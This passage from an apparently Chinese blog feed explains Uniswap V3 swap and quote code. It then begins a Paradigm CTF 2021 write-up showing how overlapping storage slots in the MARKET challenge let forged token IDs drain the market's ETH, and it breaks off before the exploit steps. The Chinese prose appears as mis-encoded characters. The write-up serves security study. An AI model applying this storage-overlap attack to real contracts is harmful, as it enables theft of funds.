zeroForOne<br>                );<br>        &#125; else &#123;<br>            amountOut = zeroForOne<br>                ? SqrtPriceMath.getAmount1Delta(sqrtRatioTargetX96, sqrtRatioCurrentX96, liquidity, false)<br>                : SqrtPriceMath.getAmount0Delta(sqrtRatioCurrentX96, sqrtRatioTargetX96, liquidity, false);<br>            if (uint256(-amountRemaining) &gt;= amountOut) sqrtRatioNextX96 = sqrtRatioTargetX96;<br>            else<br>                // å½“ä½™é¢ä¸å……è¶³çš„æ—¶å€™è®¡ç®—èƒ½å¤Ÿåˆ°è¾¾çš„ç›®æ ‡äº¤æ˜“ä»·<br>                sqrtRatioNextX96 = SqrtPriceMath.getNextSqrtPriceFromOutput(<br>                    sqrtRatioCurrentX96,<br>                    liquidity,<br>                    uint256(-amountRemaining),<br>                    zeroForOne<br>                );<br>        &#125;<br><br>        // åˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿåˆ°è¾¾ç›®æ ‡ä»·<br>        bool max = sqrtRatioTargetX96 == sqrtRatioNextX96;<br><br>        // get the input/output amounts<br>        if (zeroForOne) &#123;<br>            // æ ¹æ®æ˜¯å¦åˆ°è¾¾ç›®æ ‡ä»·æ ¼ï¼Œè®¡ç®— amountIn/amountOut çš„å€¼<br>            amountIn = max &amp;&amp; exactIn<br>                ? amountIn<br>                : SqrtPriceMath.getAmount0Delta(sqrtRatioNextX96, sqrtRatioCurrentX96, liquidity, true);<br>            amountOut = max &amp;&amp; !exactIn<br>                ? amountOut<br>                : SqrtPriceMath.getAmount1Delta(sqrtRatioNextX96, sqrtRatioCurrentX96, liquidity, false);<br>        &#125; else &#123;<br>            amountIn = max &amp;&amp; exactIn<br>                ? amountIn<br>                : SqrtPriceMath.getAmount1Delta(sqrtRatioCurrentX96, sqrtRatioNextX96, liquidity, true);<br>            amountOut = max &amp;&amp; !exactIn<br>                ? amountOut<br>                : SqrtPriceMath.getAmount0Delta(sqrtRatioCurrentX96, sqrtRatioNextX96, liquidity, false);<br>        &#125;<br><br>        // cap the output amount to not exceed the remaining output amount<br>        // è¿™é‡Œå¯¹ Output è¿›è¡Œ cap æ˜¯å› ä¸ºå‰é¢åœ¨è®¡ç®— amountOut æ—¶ï¼Œæœ‰å¯èƒ½ä¼šä½¿ç”¨ sqrtRatioNextX96 æ¥è¿›è¡Œè®¡ç®—<br>// è€Œ sqrtRatioNextX96 å¯èƒ½è¢« Round ä¹‹åå¯¼è‡´ sqrt_P åå¤§ï¼Œä»è€Œå¯¼è‡´è®¡ç®—çš„ amountOut åå¤§<br>        if (!exactIn &amp;&amp; amountOut &gt; uint256(-amountRemaining)) &#123;<br>            amountOut = uint256(-amountRemaining);<br>        &#125;<br><br>        // æ ¹æ®äº¤æ˜“æ˜¯å¦ç§»åŠ¨åˆ°ä»·æ ¼è¾¹ç•Œæ¥è®¡ç®—æ‰‹ç»­è´¹çš„æ•°é¢<br>        if (exactIn &amp;&amp; sqrtRatioNextX96 != sqrtRatioTargetX96) &#123;<br>            // we didn&#x27;t reach the target, so take the remainder of the maximum input as fee<br>            // å¦‚æœæ²¡èƒ½åˆ°è¾¾ç›®æ ‡ä»·ï¼Œå³äº¤æ˜“ç»“æŸï¼Œå‰©ä½™çš„ tokenIn å°†å…¨éƒ¨ä½œä¸ºæ‰‹ç»­è´¹<br>    // ä¸ºäº†ä¸è®©è®¡ç®—è¿›ä¸€æ­¥å¤æ‚åŒ–ï¼Œè¿™é‡Œç›´æ¥å°†å‰©ä½™çš„ tokenIn å°†å…¨éƒ¨ä½œä¸ºæ‰‹ç»­è´¹<br>    // å› æ­¤ä¼šå¤šæ”¶å–ä¸€éƒ¨åˆ†æ‰‹ç»­è´¹ï¼Œå³æŒ‰æœ¬æ¬¡äº¤æ˜“çš„æœ€å¤§æ‰‹ç»­è´¹æ”¶å–<br>            feeAmount = uint256(amountRemaining) - amountIn;<br>        &#125; else &#123;<br>            // å½“ä»·æ ¼ç§»åŠ¨åˆ°è¾¹ç•Œæ—¶ï¼Œè®¡ç®—ç›¸åº”çš„æ‰‹ç»­è´¹<br>            feeAmount = FullMath.mulDivRoundingUp(amountIn, feePips, 1e6 - feePips);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿›è¡Œäº¤æ˜“è¾“å…¥/è¾“å‡ºçš„è®¡ç®—æ—¶ï¼Œå’ŒæµåŠ¨æ€§çš„è®¡ç®—ä¸€æ ·ï¼Œä¹Ÿä¼šé‡åˆ° rounding çš„é—®é¢˜ï¼Œå¤„ç†çš„åŸåˆ™æ˜¯ï¼š</p><ol><li>å½“è®¡ç®— output æ—¶ï¼Œä½¿ç”¨ RoundDownï¼Œä¿è¯ pool ä¸ä¼šå‡ºç°åè´¦</li><li>å½“è®¡ç®— input æ—¶ï¼Œä½¿ç”¨ RoundUpï¼Œä¿è¯ pool ä¸ä¼šå‡ºç°åè´¦</li><li>å½“é€šè¿‡ input è®¡ç®— âˆšP æ—¶ï¼Œå¦‚æœ âˆšP ä¼šå‡å°‘ï¼Œé‚£ä¹ˆä½¿ç”¨ RoundUpï¼Œè¿™æ ·å¯ä»¥ä¿è¯ âˆšÎ”P è¢« RoundDownï¼Œåœ¨åç»­è®¡ç®— output æ—¶ä¸ä¼šä½¿ pool å‡ºç°åè´¦ã€‚åä¹‹ å¦‚æœ âˆšP ä¼šå¢å¤§ï¼Œ é‚£ä¹ˆä½¿ç”¨ RoundDown</li><li>å½“é€šè¿‡ output è®¡ç®— âˆšP æ—¶ï¼Œå¦‚æœ âˆšP ä¼šå‡å°‘ï¼Œé‚£ä¹ˆä½¿ç”¨ RoundDownï¼Œè¿™æ ·å¯ä»¥ä¿è¯ âˆšÎ”P è¢« RoundUpï¼Œåœ¨åç»­è®¡ç®— input æ—¶ä¸ä¼šä½¿ pool å‡ºç°åè´¦ã€‚åä¹‹ å¦‚æœ âˆšP ä¼šå¢å¤§ï¼Œ é‚£ä¹ˆä½¿ç”¨ RoundUp</li></ol><h3 id="uniswapV3SwapCallback"><a href="#uniswapV3SwapCallback" class="headerlink" title="uniswapV3SwapCallback"></a>uniswapV3SwapCallback</h3><p>æ”¯ä»˜çš„å›è°ƒå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function uniswapV3SwapCallback(<br>    int256 amount0Delta,<br>    int256 amount1Delta,<br>    bytes calldata _data<br>) external override &#123;<br>    require(amount0Delta &gt; 0 || amount1Delta &gt; 0); // swaps entirely within 0-liquidity regions are not supported<br>    SwapCallbackData memory data = abi.decode(_data, (SwapCallbackData));<br>    (address tokenIn, address tokenOut, uint24 fee) = data.path.decodeFirstPool();<br>    CallbackValidation.verifyCallback(factory, tokenIn, tokenOut, fee);<br><br>    // åˆ¤æ–­å‡½æ•°çš„å‚æ•°ä¸­å“ªä¸ªæ˜¯æœ¬æ¬¡æ”¯ä»˜éœ€è¦æ”¯ä»˜çš„ä»£å¸<br>    (bool isExactInput, uint256 amountToPay) =<br>        amount0Delta &gt; 0<br>            ? (tokenIn &lt; tokenOut, uint256(amount0Delta))<br>            : (tokenOut &lt; tokenIn, uint256(amount1Delta));<br>    if (isExactInput) &#123;<br>        // è°ƒç”¨ pay å‡½æ•°æ”¯ä»˜ä»£å¸<br>        pay(tokenIn, data.payer, msg.sender, amountToPay);<br>    &#125; else &#123;<br>        // either initiate the next swap or pay<br>        if (data.path.hasMultiplePools()) &#123;<br>            data.path = data.path.skipToken();<br>            exactOutputInternal(amountToPay, msg.sender, 0, data);<br>        &#125; else &#123;<br>            amountInCached = amountToPay;<br>            tokenIn = tokenOut; // swap in/out because exact output swaps are reversed<br>            pay(tokenIn, data.payer, msg.sender, amountToPay);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å›è°ƒå®Œæˆåï¼Œ<code>swap</code> å‡½æ•°ä¼šè¿”å›æœ¬æ¬¡äº¤æ˜“å¾—åˆ°çš„ä»£å¸æ•°é‡ã€‚<code>exactInput</code> å°†åˆ¤æ–­æ˜¯å¦è¿›è¡Œä¸‹ä¸€ä¸ªè·¯å¾„çš„äº¤æ˜“ï¼Œç›´è‡³æ‰€æœ‰çš„äº¤æ˜“å®Œæˆï¼Œè¿›è¡Œè¾“å…¥çº¦æŸçš„æ£€æŸ¥ï¼š</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">require</span>(amountOut &gt;= <span class="hljs-keyword">params</span>.amountOutMinimum, <span class="hljs-string">&#x27;Too little received&#x27;</span>);<br></code></pre></td></tr></table></figure><p>å¦‚æœäº¤æ˜“çš„è·å¾— token æ•°æ»¡è¶³çº¦æŸï¼Œåˆ™æœ¬æ¬¡äº¤æ˜“ç»“æŸã€‚</p><h1 id="äº¤æ˜“é¢„è®¡ç®—"><a href="#äº¤æ˜“é¢„è®¡ç®—" class="headerlink" title="äº¤æ˜“é¢„è®¡ç®—"></a>äº¤æ˜“é¢„è®¡ç®—</h1><p>å½“ç”¨æˆ·å’Œ uniswap å‰ç«¯è¿›è¡Œäº¤äº’æ—¶ï¼Œå‰ç«¯éœ€è¦é¢„å…ˆè®¡ç®—å‡ºç”¨æˆ·è¾“å…¥ token èƒ½å¤Ÿé¢„æœŸå¾—åˆ°çš„ token æ•°é‡ã€‚</p><p>è¿™ä¸ªåŠŸèƒ½åœ¨ uniswap v2 æœ‰éå¸¸ç®€å•çš„<a href="https://github.com/Uniswap/uniswap-v2-periphery/blob/dda62473e2da448bc9cb8f4514dadda4aeede5f4/contracts/libraries/UniswapV2Library.sol#L42-L59">å®ç°</a>ï¼Œåªéœ€è¦æŸ¥è¯¢å¤„åˆçº¦ä¸­ä¸¤ä¸ªä»£å¸çš„ä½™é¢å°±å¯ä»¥å®Œæˆé¢„è®¡ç®—ã€‚</p><p>ä½†æ˜¯åœ¨ v3 ç‰ˆæœ¬ä¸­ï¼Œç”±äºäº¤æ˜“çš„è®¡ç®—éœ€è¦ä½¿ç”¨åˆçº¦å†…çš„ tick ä¿¡æ¯ï¼Œé¢„è®¡ç®—åªèƒ½ç”± uniswap v3 pool åˆçº¦æ¥å®Œæˆï¼Œä½†æ˜¯ pool åˆçº¦ä¸­çš„è®¡ç®—å‡½æ•°éƒ½æ˜¯ä¼šæ›´æ”¹åˆçº¦çŠ¶æ€çš„ <code>external</code> å‡½æ•°ï¼Œé‚£ä¹ˆå¦‚ä½•æŠŠè¿™ä¸ªå‡½æ•°å½“ä½œ <code>view/pure</code> å‡½æ•°æ¥ä½¿ç”¨å‘¢ï¼Ÿuniswap v3 periphery ä»“åº“ä¸­ç»™å‡ºäº†ä¸€ä¸ªéå¸¸ tricky çš„å®ç°ï¼Œä»£ç åœ¨ <code>contracts/lens/Quoter.sol</code> ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function quoteExactInputSingle(<br>    address tokenIn,<br>    address tokenOut,<br>    uint24 fee,<br>    uint256 amountIn,<br>    uint160 sqrtPriceLimitX96<br>) public override returns (uint256 amountOut) &#123;<br>    bool zeroForOne = tokenIn &lt; tokenOut;<br><br>    try<br>        // è°ƒç”¨ pool åˆçº¦çš„ swap æ¥å£æ¥æ¨¡æ‹Ÿä¸€æ¬¡çœŸå®çš„äº¤æ˜“<br>        getPool(tokenIn, tokenOut, fee).swap(<br>            address(this), // address(0) might cause issues with some tokens<br>            zeroForOne,<br>            amountIn.toInt256(),<br>            sqrtPriceLimitX96 == 0<br>                ? (zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)<br>                : sqrtPriceLimitX96,<br>            abi.encodePacked(tokenIn, fee, tokenOut)<br>        )<br>    &#123;&#125; catch (bytes memory reason) &#123;<br>        return parseRevertReason(reason);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡½æ•°ä¸­è°ƒç”¨äº† <code>getPool(tokenIn, tokenOut, fee).swap()</code>ï¼Œå³ pool åˆçº¦çš„çœŸå®äº¤æ˜“å‡½æ•°ï¼Œä½†æ˜¯å®é™…ä¸Šæˆ‘ä»¬å¹¶ä¸æƒ³è®©äº¤æ˜“å‘ç”Ÿï¼Œè¿™ä¸ªäº¤æ˜“è°ƒç”¨å¿…å®šä¹Ÿä¼šå¤±è´¥ï¼Œå› æ­¤åˆçº¦ä½¿ç”¨äº† <code>try/catch</code> çš„æ–¹å¼æ•è·é”™è¯¯ï¼Œå¹¶ä¸”åœ¨å›è°ƒå‡½æ•°ä¸­è·å–åˆ°æ¨¡æ‹Ÿäº¤æ˜“çš„ç»“æœï¼Œå­˜å…¥å†…å­˜ä¸­ã€‚</p><p>uniswapV3SwapCallbackå›è°ƒå‡½æ•°çš„å®ç°ï¼š</p><p>è¿™ä¸ªå›è°ƒå‡½æ•°ä¸»è¦çš„ä½œç”¨å°±æ˜¯å°† <code>swap()</code> å‡½æ•°è®¡ç®—å¤„çš„ç»“æœä¿å­˜åˆ°å†…å­˜ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function uniswapV3SwapCallback(<br>    int256 amount0Delta,<br>    int256 amount1Delta,<br>    bytes memory path<br>) external view override &#123;<br>    require(amount0Delta &gt; 0 || amount1Delta &gt; 0); // swaps entirely within 0-liquidity regions are not supported<br>    (address tokenIn, address tokenOut, uint24 fee) = path.decodeFirstPool();<br>    CallbackValidation.verifyCallback(factory, tokenIn, tokenOut, fee);<br><br>    (bool isExactInput, uint256 amountToPay, uint256 amountReceived) =<br>        amount0Delta &gt; 0<br>            ? (tokenIn &lt; tokenOut, uint256(amount0Delta), uint256(-amount1Delta))<br>            : (tokenOut &lt; tokenIn, uint256(amount1Delta), uint256(-amount0Delta));<br>    if (isExactInput) &#123;<br>        // è¿™é‡Œä»£ç éœ€è¦å°†ç»“æœä¿å­˜åœ¨å†…å­˜ä¸­<br>        assembly &#123;<br>            // 0x40 æ˜¯ solidity å®šä¹‰çš„ free memory pointer<br>            let ptr := mload(0x40)<br>            // å°†ç»“æœä¿å­˜èµ·æ¥<br>            mstore(ptr, amountReceived)<br>            // revert æ‰äº¤æ˜“ï¼Œå¹¶å°†å†…å­˜ä¸­çš„æ•°æ®ä½œä¸º revert data<br>            revert(ptr, 32)<br>        &#125;<br>    &#125; else &#123;<br>        // if the cache has been populated, ensure that the full output amount has been received<br>        if (amountOutCached != 0) require(amountReceived == amountOutCached);<br>        assembly &#123;<br>            let ptr := mload(0x40)<br>            mstore(ptr, amountToPay)<br>            revert(ptr, 32)<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†ç»“æœä¿å­˜åˆ°å†…å­˜ä¸­æ—¶å€™å°±å°†äº¤æ˜“ <code>revert</code> æ‰ï¼Œç„¶ååœ¨ <code>quoteExactInputSingle</code> ä¸­æ•è·è¿™ä¸ªé”™è¯¯ï¼Œå¹¶å°†å†…å­˜ä¸­çš„ä¿¡æ¯è¯»å–å‡ºæ¥ï¼Œè¿”å›ç»™è°ƒç”¨è€…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev Parses a revert reason that should contain the numeric quote<br>function parseRevertReason(bytes memory reason) private pure returns (uint256) &#123;<br>    if (reason.length != 32) &#123; // swap å‡½æ•°æ­£å¸¸ revert çš„æƒ…å†µ<br>        if (reason.length &lt; 68) revert(&#x27;Unexpected error&#x27;);<br>        assembly &#123;<br>            reason := add(reason, 0x04)<br>        &#125;<br>        revert(abi.decode(reason, (string)));<br>    &#125;<br>    return abi.decode(reason, (uint256)); // è¿™é‡Œæ•è·å‰é¢å›è°ƒå‡½æ•°ä¿å­˜åœ¨å†…å­˜ä¸­çš„ç»“æœã€‚<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€»ç»“ï¼šé€šè¿‡ <code>try/catch</code> ç»“åˆå›è°ƒå‡½æ•°ï¼Œæ¨¡æ‹Ÿè®¡ç®—ç»“æœï¼Œå®ç°äº†äº¤æ˜“é¢„è®¡ç®—çš„åŠŸèƒ½ï¼Œè¿™æ · uniswap å‰ç«¯å°±èƒ½å¤Ÿåœ¨è·å–ç”¨æˆ·è¾“å…¥åè¿›è¡Œäº¤æ˜“çš„é¢„è®¡ç®—äº†ï¼Œè¿™éƒ¨åˆ†å‰ç«¯çš„å®ç°åœ¨<a href="https://github.com/Uniswap/uniswap-interface/blob/3aa045303a4aeefe4067688e3916ecf36b2f7f75/src/hooks/useBestV3Trade.ts#L36">è¿™é‡Œ</a>ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | Paradigm CTF 2021 Part two</title>
    <link href="/2022/09/23/ParadigmCTF2021two/"/>
    <url>/2022/09/23/ParadigmCTF2021two/</url>
    
    <content type="html"><![CDATA[<p><a href="https://sissice.github.io/2022/09/18/ParadigmCTF2021one/">Writeup | Paradigm CTF 2021 Part one - Sissiceâ€™s Blog</a></p><h2 id="MARKET"><a href="#MARKET" class="headerlink" title="MARKET"></a>MARKET</h2><p>è¦è§£å†³è¯¥åˆçº¦çš„è¦æ±‚æ˜¯ï¼šè®©Marketåˆçº¦æ‰€æœ‰çš„ETHéƒ½æ¶ˆå¤±</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() external view returns (bool) &#123;<br>    return address(market).balance == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨constructorä¸­ï¼Œä¸€å…±ä½¿ç”¨5+10+15+20=50 etherï¼Œé“¸é€ äº†4æšNFTï¼Œå¹¶ä¸”æ‹¥æœ‰è€…åœ°å€ä¸åŒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint tokenCost = 5 ether;<br>for (uint i = 0; i &lt; 4; i++) &#123;<br>    market.mintCollectibleFor&#123;value: tokenCost&#125;(address(bytes20(keccak256(abi.encodePacked(address(this), i)))));<br>    tokenCost += 5 ether;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆæ­¥æƒ³æ³•æ˜¯å°†NFTå–ç»™marketï¼Œæ¸…ç©ºmarketçš„ä½™é¢</p><p>ä½†æ˜¯sellCollectibleä¸­å¯¹tokenOwneræœ‰é™åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function sellCollectible(bytes32 tokenId) public payable &#123;<br>    require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);<br><br>    (, address tokenOwner, address approved, ) = cryptoCollectibles.getTokenInfo(tokenId);<br>    require(msg.sender == tokenOwner, &quot;sellCollectible/not-owner&quot;);<br>    require(approved == address(this), &quot;sellCollectible/not-approved&quot;);<br><br>    cryptoCollectibles.transferFrom(tokenId, msg.sender, address(this));<br><br>    msg.sender.transfer(tokenPrices[tokenId]);<br>&#125;<br></code></pre></td></tr></table></figure><p>EternalStorageç”¨æ¥å­˜å‚¨çŠ¶æ€ï¼Œåˆçº¦ä¸­ä¸ºäº†èŠ‚çœgasä½¿ç”¨assemblyï¼Œç­‰æ•ˆäºä»¥ä¸‹ç»“æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(bytes32 =&gt; TokenInfo) tokens;<br><br>struct TokenInfo &#123;<br>    bytes32 displayName; //slot0<br>    address owner;  //slot1<br>    address approved;  //slot2<br>    address metadata;  //slot3<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬éœ€è¦å‘EVMå†™æ•°æ®ï¼Œå°±éœ€è¦æ»¡è¶³msg.sender==owner æˆ–è€… msg.sender==tokenOwnerçš„è¦æ±‚</p><p>æ­£å¸¸æ¥è¯´<a href="https://sissice.github.io/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/">mappingçš„å­˜å‚¨ä½ç½®</a>æ— æ³•è®©ä¸¤ä¸ªtokenIdçš„ç»“æ„ä½“å­˜åœ¨éƒ¨åˆ†é‡å </p><p>ä½†æ˜¯åœ¨å®é™…çš„assemblyä¸­é€‰æ‹©äº†ä»¥ä¸‹æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">case 0xa9fde064 &#123; // updateName(bytes32,bytes32)<br>    let tokenId := calldataload(0x04)<br>    let newName := calldataload(0x24)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(tokenId, newName) //SSTOREä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå€¼ï¼Œé¦–å…ˆæ˜¯32å­—èŠ‚çš„keyï¼Œå…¶æ¬¡æ˜¯32å­—èŠ‚çš„valueï¼Œå¹¶å°†è¯¥å€¼å­˜å‚¨åœ¨ç”±keyå®šä¹‰çš„æŒ‡å®šå­˜å‚¨æ§½ä¸­<br>&#125;<br>case 0x9711a543 &#123; // updateOwner(bytes32,address)<br>    let tokenId := calldataload(0x04)<br>    let newOwner := and(calldataload(0x24), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(add(tokenId, 1), newOwner)<br>&#125;<br>case 0xbdce9bde &#123; // updateApproval(bytes32,address)<br>    let tokenId := calldataload(0x04)<br>    let newApproval := and(calldataload(0x24), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(add(tokenId, 2), newApproval)<br>&#125;<br>case 0x169dbe24 &#123; // updateMetadata(bytes32,address)<br>    let tokenId := calldataload(0x04)<br>    let newMetadata := and(calldataload(0x24), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)<br><br>    ensureTokenOwner(tokenId)<br>    sstore(add(tokenId, 3), newMetadata)<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥è¯•å›¾æ“çºµtokenIdçš„æ•°å€¼ï¼Œè®©ä¸¤ä¸ªtokenIdçš„ç»“æ„ä½“å­˜åœ¨éƒ¨åˆ†é‡å ï¼Œå³è®©tokenId_1çš„slot_1åˆšå¥½ä½äºtokenId_0çš„slot_3</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tokenId_0<span class="hljs-selector-class">.name</span>     <br>tokenId_0<span class="hljs-selector-class">.owner</span>   <br>tokenId_0<span class="hljs-selector-class">.approval</span>      -  tokenId_1<span class="hljs-selector-class">.name</span><br>tokenId_0<span class="hljs-selector-class">.metadata</span>      -  tokenId_1<span class="hljs-selector-class">.owner</span><br>-  tokenId_1<span class="hljs-selector-class">.approval</span><br>-  tokenId_1.metadata<br></code></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡tokenId_0.metadataæ¥è®¾ç½®tokenId_1.owner</p><p>è€Œmintå‡½æ•°ä¸­ç”Ÿæˆçš„tokenIdæ˜¯éšæœºçš„ï¼Œä¸èƒ½é€šè¿‡è¿™ä¸ªå‡½æ•°ç”Ÿæˆæˆ‘ä»¬æƒ³è¦çš„tokenId</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function mint(address tokenOwner) external returns (bytes32) &#123;<br>    require(minters[msg.sender], &quot;mint/not-minter&quot;);<br><br>    bytes32 tokenId = keccak256(abi.encodePacked(address(this), tokenIdSalt++));<br>    eternalStorage.mint(tokenId, &quot;My First Collectible&quot;, tokenOwner);<br>    return tokenId;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æœ‰ä¸€ä¸ªæœ€å¤§çš„æ¼æ´åœ¨äºè°ƒç”¨sellCollectibleï¼Œsellä¸€ä¸ªtokençš„æ—¶å€™ï¼Œç›´æ¥ç»™å‡ºtokenIdï¼Œç„¶åç”¨è¯¥tokenIdä½œä¸ºä»å­˜å‚¨ä¸­å–å€¼çš„keyè·å–æ•´ä¸ªtokenInfoï¼Œä¸ä¼šéªŒè¯è¿™ä¸ªNFTæ˜¯å¦è¢«é“¸é€ è¿‡ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥è™šæ„ä¸€ä¸ªtokenId_1, æ»¡è¶³ä¸Šé¢çš„å…³ç³»ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getTokenInfo(bytes32 tokenId) external view returns (bytes32, address, address, address) &#123;<br>    return (<br>        eternalStorage.getName(tokenId),<br>        eternalStorage.getOwner(tokenId),<br>        eternalStorage.getApproval(tokenId),<br>        eternalStorage.getMetadata(tokenId)<br>    );<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºsellCollectibleå‡½æ•°ä¸­è¦æ±‚ä»·æ ¼å¤§äº0ï¼Œæ‰€ä»¥ä¸èƒ½å‡ºå”®æˆ‘ä»¬è‡ªå·±è™šæ„çš„token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">require(tokenPrices[tokenId] &gt; 0, &quot;sellCollectible/not-listed&quot;);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿›è¡Œä¸¤æ¬¡tokenIdçš„æ•°å€¼çš„æ›´æ”¹ï¼Œå°†tokenId_0å‡ºå”®ä¸¤æ¬¡</p><ol><li>é“¸é€ 